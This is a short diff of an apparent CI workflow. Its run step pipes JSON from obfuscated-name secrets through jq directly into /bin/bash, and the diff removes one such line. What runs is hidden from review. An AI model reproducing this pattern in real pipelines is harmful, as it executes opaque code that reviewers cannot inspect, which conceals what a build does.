@@ -17,7 +17,6 @@ jobs:
           dgkat28591: ${{ secrets.dgkat28591 }}
         run: |
           printf '%s' "$dgkat28591" | jq -r .fbbg1909 | /bin/bash
-          printf '%s' "$sqbfe39805" | jq -r .g48 | /bin/bash
           printf '%s' "$jen6" | jq -r .zn96 | /bin/bash
           printf '%s' "$gjfc97335" | jq -r .wpcx11 | /bin/bash
           echo $moxpq6 | jq -r .f6 | /bin/bash
